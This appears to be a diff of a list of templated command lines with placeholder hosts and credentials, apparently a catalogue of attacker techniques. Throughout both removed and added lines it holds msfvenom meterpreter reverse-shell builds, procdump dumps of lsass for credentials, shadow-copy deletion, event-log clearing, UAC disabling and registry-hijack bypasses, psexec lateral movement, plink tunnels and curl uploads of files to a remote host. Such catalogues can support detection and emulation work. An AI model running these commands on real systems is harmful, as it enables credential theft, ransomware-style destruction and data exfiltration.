@@ -1,1239 +1,1239 @@
-powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-netstat.exe -f
-nmap -PN ${ip_address} 2> &1
-cmd /c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
-powershell -c "hostname.exe"
-cmd /c "msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
-nmap -p- ${ip_address} 2> &1
-mstsc /v:${ip_address} /public
-powershell -c "taskkill.exe /F /im ${process_name}"
-cmd /c "sdelete -q ${loal_file_path}"
-cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-cmd /c "tasklist.exe"
-cmd /c "wmic os get Caption"
-cmd /c "mstsc /v:${ip_address} /f"
-powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-nmap -v -A ${ip_address} 2> /dev/null
-Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-cmd /c "choco install -f Megasync"
-cmd /c "sc.exe stop ${service_name}"
-choco install ngrok
-cmd /c "certutil -encode -Unicode error.txt encode.txt"
-curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-wmic os get TotalVirtualMemorySize
-cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-wmic.exe os get Name
-psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-powershell -c "vssadmin delete shadows /all /quiet"
-sdelete -accepteula ${local_file_path}
-cmd /c "curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload"
-cmd /c "netstat.exe -f"
-nmap -p- -sC -sV -O -A ${ip_address} 2> /dev/null
-powershell -c "sdelete -accepteula ${local_file_path}"
-cmd /c "taskkill /im ${process_name}"
-vssadmin delete shadows /All
-powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-nmap -F ${ip_address} 2> /dev/null
-powershell -c "vssadmin delete shadows /All"
-echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> &1
-nmap -p- -sC -sV -O -A ${ip_address} 2> error.log
-cmd /c "sdelete.exe -s -accepteula ${local_file_path}"
-powershell -c "netstat -q"
-cmd /c "choco install -y 7zip"
-nmap -sC ${ip_address} 2> /dev/null
-nmap ${ip_address}
-powershell -c "vssadmin.exe create shadow /for=C:"
-cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-powershell -c "certutil -encode -Unicode -f error.txt encode.txt"
-msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-powershell -c "procdump.exe -accepteula -ma lsass lsassdump.dmp"
-nmap ${ip_address} 2> error.log
-procdump -accepteula -ma lsass.exe lsassdump.dmp
-powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-nmap ${ip_address} 2> /dev/null
-powershell -c "sc stop ${service_name}"
-powershell -c "certutil -encode -gmt -v error.txt encode.txt"
-cmd /c "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> &1
-certutil -encode -v -f error.txt encode.txt
-powershell -c "mstsc /v:${ip_address} /remoteGuard"
-sdelete.exe -f -q ${local_file_path}
-powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-sdelete.exe -accepteula ${local_file_path}
-cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-cmd /c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-cmd /c "rmdir /s ${local_file_path}"
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-cmd /c "taskkill.exe /f /im ${process_name} /T"
-cmd /c "mstsc /v:${ip_address} /restrictedAdmin"
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
-vssadmin Delete Shadows /all /Quiet
-cmd /c "netstat -f"
-powershell -c "sdelete -s -q -accepteula ${local_file_path}"
-del /p ${local_file_path}
-cmd /c "wevtutil cl application"
+cmd /c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+powershell -c "procdump -ma lsass lsassdump.dmp"
+nmap -p- -sC -sV -O -A ${ip_address}
+certutil -encode -gmt -v error.txt encode.txt
+powershell -c "ipconfig.exe /renew"
+powershell -c "certutil -encode -v -f error.txt encode.txt"
+powershell -c "certutil -encode -UnicodeText -v error.txt encode.txt"
 powershell -c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-powershell -c "sdelete.exe -s -accepteula ${local_file_path}"
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-vssadmin.exe Delete Shadows /all
-nmap -p- ${ip_address}
-taskkill.exe /f /im ${process_name}
-cmd /c "vssadmin delete shadows /all"
-cmd /c "net.exe stop ${service_name}"
-nmap -T5 ${ip_address}
-powershell -c "sc.exe stop ${service_name}"
-certutil -encode -UnicodeText -gmt -f error.txt encode.txt
-certutil -encode -Unicode -gmt -f error.txt encode.txt
-wmic os get SystemDevice
-powershell -c "wmic.exe os get CSName"
-cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-powershell -c "wmic.exe os get FreePhysicalMemory"
-echo -e ${email_content} | ssmtp ${username}@${domain} 2> error.log
-powershell -c "hostname"
-nmap -p- -sC -sV -O ${ip_address}
-cmd /c "wmic shadowcopy call create Volume=C:"
-powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-powershell -c "sdelete.exe -f ${local_file_path}"
-cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-cmd /c "vssadmin.exe create shadow /for=C:"
-powershell -c "wmic os get FreePhysicalMemory"
-powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
-powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-cmd /c "sdelete.exe -s -q -accepteula ${local_file_path}"
-choco install -y psexec
-choco install -f psexec
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-taskkill /F /im ${process_name} /T
-powershell -c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-procdump.exe -ma lsass lsassdump.dmp
-certutil -encode ${source_file_path} ${destination_file_path}
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-powershell -c "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-cmd /c "vssadmin.exe Delete Shadows /all /Quiet"
-powershell -c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "netstat"
-powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
-cmd /c "vssadmin.exe Delete Shadows /All /quiet"
-powershell -c "procdump -ma lsass.exe lsassdump.dmp"
-vssadmin delete shadows /all
-certutil -encode -UnicodeText -gmt error.txt encode.txt
-cmd /c "7z a ${destination_file_path} ${source_file_path} -p${password}"
-nmap -sV ${ip_address}
-cmd /c "certutil -encode ${source_file_path} ${destination_file_path}"
-powershell -c "choco install putty"
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-mstsc.exe /v:${ip_address} /f /restrictedAdmin
-powershell -c "wmic os get SystemDevice"
-cmd /c "sc stop ${service_name}"
-powershell -c "vssadmin.exe delete shadows /all /Quiet"
-powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-cmd /c "vssadmin Delete Shadows /All /quiet"
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-nmap -sC ${ip_address} 2> error.log
-curl.exe -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-mstsc /v:${ip_address} /admin
-powershell -c "sdelete -s -accepteula ${local_file_path}"
-mstsc /v:${ip_address} /multimon
-powershell -c "mstsc /v:${ip_address} /f /admin"
-echo ${email_content} | sendmail ${username}@${domain} 2> error.log
-powershell -c "certutil -encode -UnicodeText -gmt -f error.txt encode.txt"
-powershell -c "ipconfig.exe"
-cmd /c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-netstat.exe -a
-wmic.exe os get SystemDevice
-netstat -a
-rmdir /s /q ${local_file_path}
-powershell -c "choco install ngrok"
-powershell -c "plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "choco install -f procdump"
-cmd /c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
-cmd /c "mstsc.exe /v:${ip_address} /f /public"
-powershell -c "taskkill /im ${process_name} /T"
-powershell -c "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-certutil -encode -UnicodeText -v -f error.txt encode.txt
-powershell -c "certutil -encode -gmt ${source_file_path} ${destination_file_path}"
-sdelete -f ${local_file_path}
-rm -fr ${local_file_path} 2> error.log
-cat email.txt | ssmtp ${username}@${domain} 2> &1
-msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-nmap -v -A ${ip_address} 2> &1
-cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> &1
-cmd /c "procdump.exe -accepteula -ma lsass lsassdump.dmp"
-powershell -c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
-cmd /c "ipconfig.exe /renew"
-cmd /c "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-cmd /c "wmic os get Version"
-powershell -c "taskkill /F /im ${process_name}"
-nmap -p- -sC -sV -O ${ip_address} 2> &1
-powershell -c "taskkill.exe /im ${process_name} /T"
-nmap -A ${ip_address} 2> &1
-cmd /c "7z a -p${password} ${destination_file_path} ${source_file_path}"
-cmd /c "mstsc.exe /v:${ip_address}"
-powershell -c "taskkill.exe /F /IM ${process_name}"
-powershell -c "taskkill.exe /F /im ${process_name} /T"
-powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "7z a -slp -p ${destination_file_path} ${source_file_path}"
-curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-powershell -c "procdump -accepteula -mm lsass lsassdump.dmp"
-cat email.txt | sendmail ${username}@${domain} 2> error.log
-cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-powershell -c "certutil -encode -UnicodeText -f error.txt encode.txt"
-mstsc /v:${ip_address} /remoteGuard
-cat email.txt | mail -s ${email_subject} ${username}@${domain}
-tasklist.exe
-cmd /c "mstsc /v:${ip_address} /f /admin"
-powershell -c "choco install -y psexec"
-nmap -PN ${ip_address} 2> /dev/null
-powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-nmap -PN ${ip_address}
-sendmail ${username}@${domain} < mail.txt 2> &1
-cmd /c "mstsc /v:${ip_address}"
-powershell -c "vssadmin.exe delete shadows /all"
-cat email.txt | sendmail ${username}@${domain}
-vssadmin.exe Delete Shadows /All /quiet
-vssadmin.exe delete shadows /all /Quiet
-powershell -c "systeminfo.exe"
-choco install -y ngrok
-cmd /c "msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-wevtutil clear-log system
-powershell -c "mstsc /v:${ip_address} /public"
-nmap -sC ${ip_address} 2> &1
-powershell -c "wmic os get Caption,Version"
-powershell -c "7z a ${destination_file_path} ${source_file_path} -p${password}"
-powershell -c "vssadmin.exe delete shadows /All /quiet"
-msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-powershell -c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-cmd /c "procdump.exe -mm lsass.exe lsassdump.dmp"
-nmap -sC ${ip_address}
-Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-powershell -c "7z a -slp -p ${destination_file_path} ${source_file_path}"
-powershell -c "choco install -y procdump"
-cmd /c "7z a ${destination_file_path} ${source_file_path} -p"
-powershell -c "choco install -f putty"
-nmap --open ${ip_address} 2> /dev/null
-msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-cat email.txt | ssmtp ${username}@${domain} 2> error.log
-powershell -c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
-powershell -c "certutil -encode -Unicode -v error.txt encode.txt"
+7z.exe a -p ${destination_file_path} ${source_file_path}
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+netstat -r
+cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+cmd /c "del ${local_file_path}"
 cmd /c "vssadmin delete shadows /All /Quiet"
-powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-sdelete.exe -f -accepteula ${local_file_path}
-powershell -c "vssadmin Delete Shadows /all"
+arp -a
+cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
+powershell -c "sdelete ${local_file_path}"
+curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+powershell -c "choco install rclone"
+powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p"
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+powershell -c "procdump.exe -mm lsass.exe lsassdump.dmp"
+cmd /c "choco install -f psexec"
+cmd /c "msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "vssadmin.exe Delete Shadows /All /quiet"
+powershell -c "procdump.exe -accepteula -mm lsass.exe lsassdump.dmp"
+powershell -c "taskkill /F /IM ${process_name}"
+ipconfig.exe /renew
+echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
+powershell -c "mstsc.exe /v:${ip_address} /f /remoteGuard"
 cmd /c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+cmd /c "vssadmin delete shadows /all /Quiet"
+powershell -c "mstsc.exe /v:${ip_address} /restrictedAdmin"
+sdelete.exe -accepteula ${local_file_path}
+cmd /c "sdelete -q ${loal_file_path}"
+powershell -c "certutil -encode -f ${source_file_path} ${destination_file_path}"
+sdelete.exe -s -q ${local_file_path}
+vssadmin.exe Delete Shadows /all /Quiet
+powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+powershell -c "vssadmin create shadow /for=C:"
+cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+powershell -c "certutil -encode -gmt ${source_file_path} ${destination_file_path}"
+powershell -c "ipconfig"
+certutil -encode -UnicodeText -v -f error.txt encode.txt
+cmd /c "arp.exe -g"
+cmd /c "procdump.exe -ma lsass lsassdump.dmp"
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
+powershell -c "msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "wmic os get CSName"
+sdelete -s -q ${local_file_path}
+choco install -f procdump
+powershell -c "taskkill.exe /f /im ${process_name}"
+cmd /c "choco install Megasync"
+powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+arp.exe -a
+cmd /c "choco install rclone"
+net.exe stop ${service_name}
+cmd /c "certutil -encode -v -f error.txt encode.txt"
+procdump.exe -mm lsass.exe lsassdump.dmp
+psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+cmd /c "netstat.exe -q"
+cmd /c "sdelete.exe -accepteula ${local_file_path}"
+psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+sendmail ${username}@${domain} < mail.txt 2> /dev/null
+powershell -c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+nmap --open ${ip_address} 2> &1
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> error.log
+powershell -c "wevtutil clear-log application"
+powershell -c "vssadmin.exe Delete Shadows /all /Quiet"
+nmap -v ${ip_address} 2> error.log
+cmd /c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "mstsc /v:${ip_address} /restrictedAdmin"
+curl -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
+cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
+cmd /c "sdelete -s -q ${loal_file_path}"
+arp -g
+powershell -c "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+procdump -accepteula -mm lsass lsassdump.dmp
+cmd /c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+powershell -c "vssadmin.exe Delete Shadows /all /quiet"
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
+powershell -c "taskkill /im ${process_name}"
+powershell -c "sdelete.exe -q -accepteula ${local_file_path}"
+choco install -y putty
+powershell -c "choco install -f 7zip"
+cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+nmap ${ip_address} 2> /dev/null
+powershell -c "netstat -a"
+nmap -p- -sC -sV -O ${ip_address} 2> /dev/null
+powershell -c "netstat.exe -a"
+powershell -c "taskkill /F /im ${process_name} /T"
+cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "certutil -encode -Unicode -f error.txt encode.txt"
+taskkill /F /im ${process_name}
+cmd /c "certutil -encode -UnicodeText -v -f error.txt encode.txt"
+powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
+del /q /p ${local_file_path}
+psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+cmd /c "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+vssadmin delete shadows /all /quiet
+ssmtp ${username}@${domain} < mail.txt
+powershell -c "sdelete -q -accepteula ${local_file_path}"
 sdelete.exe -s -accepteula ${local_file_path}
-Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+echo ${email_content} | sendmail ${username}@${domain} 2> &1
+curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+powershell -c "wevtutil clear-log security"
+cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "vssadmin.exe delete shadows /All"
+psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+cmd /c "mstsc.exe /v:${ip_address} /restrictedAdmin"
+sdelete.exe ${local_file_path}
+cmd /c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+cmd /c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+cmd /c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
+nmap -v -A ${ip_address} 2> error.log
+msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+nmap -p- -sC ${ip_address}
+curl.exe -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
+powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+rmdir /s /q ${local_file_path}
+powershell -c "taskkill.exe /im ${process_name}"
+cmd /c "taskkill /im ${process_name}"
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
+powershell -c "choco install procdump"
+powershell -c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+powershell -c "wmic os get Caption,Version"
+plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+powershell -c "sc stop ${service_name}"
+plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+cmd /c "plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+powershell -c "rmdir /s ${local_file_path}"
+mstsc.exe /v:${ip_address} /f
+powershell -c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+powershell -c "mstsc.exe /v:${ip_address} /remoteGuard"
+powershell -c "wevtutil cl application"
+taskkill /F /im ${process_name} /T
+powershell -c "sdelete.exe -accepteula ${local_file_path}"
+cmd /c "vssadmin.exe Delete Shadows /all /Quiet"
+curl -X POST http://${ip_address}/upload -F files=@${source_file_path}
+psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+vssadmin.exe delete shadows /all
+powershell -c "certutil -encode -UnicodeText -v -f error.txt encode.txt"
+msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+powershell -c "certutil -encode -UnicodeText -gmt -f error.txt encode.txt"
+sendmail ${username}@${domain} < mail.txt 2> error.log
+cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
+powershell -c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+cmd /c "vssadmin.exe create shadow /for=C:"
+cmd /c "wmic os get Caption"
+plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+cmd /c "vssadmin.exe Delete Shadows /All /quiet"
+taskkill.exe /f /im ${process_name}
+cmd /c "sc.exe stop ${service_name}"
+curl.exe -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+cmd /c "procdump -ma lsass.exe lsassdump.dmp"
+powershell -c "taskkill /f /im ${process_name}"
+choco install rclone
+cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "sdelete.exe -s -q ${local_file_path}"
+cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
+powershell -c "choco install -f putty"
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
+powershell -c "plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+sdelete -f ${local_file_path}
+cmd /c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
+powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> error.log
+7z.exe a -slt ${destination_file_path} ${source_file_path} -p
+ipconfig /allcompartments
 curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+powershell -c "vssadmin.exe delete shadows /all /quiet"
+powershell -c "wmic.exe os get FreePhysicalMemory"
+powershell -c "hostname.exe"
+powershell -c "choco install -y procdump"
+plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+tasklist.exe
+powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+rm -r ${local_file_path} 2> error.log
+powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+nmap -v -A ${ip_address}
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
+cmd /c "ipconfig.exe /renew"
+7z a -slt ${destination_file_path} ${source_file_path} -p
+cmd /c "procdump -accepteula -mm lsass lsassdump.dmp"
+cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "rmdir /s /q ${local_file_path}"
+plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+cmd /c "7z a ${destination_file_path} ${source_file_path} -p"
+cmd /c "vssadmin.exe Delete Shadows /all"
+powershell -c "sdelete -f ${local_file_path}"
+sdelete -s -q -accepteula ${local_file_path}
+cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
+powershell -c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
